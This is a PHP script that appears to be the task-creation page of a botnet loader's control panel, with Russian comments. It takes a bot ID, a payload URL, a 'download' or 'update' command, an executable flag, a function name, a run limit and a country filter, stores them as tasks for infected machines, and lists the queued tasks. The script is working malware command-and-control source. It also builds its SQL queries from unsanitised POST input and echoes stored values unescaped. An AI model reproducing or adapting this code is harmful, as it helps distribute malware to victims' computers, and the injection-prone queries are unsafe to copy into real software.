<?
/* Сладких снов счастье =) */

//file_put_contents('1.txt',implode("\r\n",$_POST));

header('Content-Type: text/html; charset=utf-8');

if (!@$pageIncluded) chdir('..');

require_once("config.php");
require_once("ln/ln.php");
require_once("includes/mysql.php");

$db=new odbcClass();

require_once("includes/functions.php");

$config["language"] == "ru" ? $l = "ru" : $l = "en";

	if (!function_exists('geoip_country_name_by_name')) include('includes/geoip.php');
	$gip = new GeoIP;


if (!isset($_POST['cc'])) {$_POST['cc']='all';}
$_POST['cc']=trim($_POST['cc'],',');
$cc=explode(',',$_POST['cc']);
$c = Array();
if($cc[0]=='0') { $c[]='all'; } else {
	foreach($cc as $k => $v) {
		$c[]=$gip->GEOIP_COUNTRY_CODES[$v];
	}
}

$flags=Array();

if (isset($_POST['bid']) && $_POST['bid']!='') { $bid=$_POST['bid']; } else { $bid='all'; }

if (isset($_POST['url']) && $_POST['url']!='') { $url=$_POST['url']; } else {$url='';}

if (isset($_POST['command']) && $_POST['command']!='') { $command=$_POST['command']; } else { $command='download'; }

if (isset($_POST['fileType']) && $_POST['fileType']=='exe') { $flags[]='e'; } else { $flags[]='d'; }

// правка от 2 сентября 2011г.
if ($command=='update') { $flags = Array(); }

if (isset($_POST['funcName']) && $_POST['funcName']!='') { $flags[]='p'; $funcName=$_POST['funcName']; } else { $funcName=''; }

if (isset($_POST['limit']) && $_POST['limit']!='') { $limits=$_POST['limit']; } else { $limits=0; }

if (!empty($_POST['url'])) {


	$bid = $_POST['bid'] ? $_POST['bid'] : 'all';
	
	$id=$db->query("INSERT INTO `tasks` VALUES('', '".$bid."', '".$url."', '".$command."', '".implode('',$flags)."', '".$funcName."', ".$limits.", '0', '0');");
	foreach($c as $v) { 
		$db->query("INSERT INTO `ccTaskFilter` VALUES('".$id."', '".$v."');"); 
	}
	
	
	
	$r=$db->query("SELECT id, `count`, url, command, flags, functionName, `limit`, stop 
FROM `tasks` 
LEFT JOIN `finished` ON tasks.id = finished.taskId 
WHERE tasks.id = '".$id."' AND tasks.stop != '-1'
GROUP BY finished.taskId");
	foreach($r as $k=>$v){
		echo '<tr>';
		echo '<td><img align="top" style="margin-top:0px;margin-right:5px;margin-left:5px;" src="images/task.png">'.$v['id'].'</td>';
		echo '<td id="url'.$v['id'].'">'.$v['url'].'</td>';
		echo '<td>';
		echo $v['command']=='' ? "" : $v['command'];
		echo '</td>';
		echo '<td>';
		echo $v['flags']=='' ? "" : $v['flags'];
		echo '</td>';
		echo '<td>';
		echo $v['functionName']=='' ? "&nbsp;" : $v['functionName'];
		echo '</td>';
		echo '<td>';
		echo $v['limit']==0 ? "unlimited" : $v['limit'];
		echo '</td>';
		echo '<td>';
		echo $v['count'];
		echo '</td>';
		echo '<td><span class="delBtn" onClick="doDel('.$v['id'].',this);">'.$lang[$l][6].'</span> | <span class="delBtn" onClick="doEdit('.$v['id'].',this);">'.$lang[$l][7].'</span> | ';
		if ($v['stop']==0) echo '<span class="delBtn" onClick="doStopTask('.$v['id'].',this);">'.$lang[$l][8].'</span></td>';
		if ($v['stop']==1) echo '<span class="delBtn" onClick="doStopTask('.$v['id'].',this);">'.$lang[$l][9].'</span></td>';
		echo "</tr>";
	}	
	
} else { 
	echo $lang[$l][59]."";
}

?>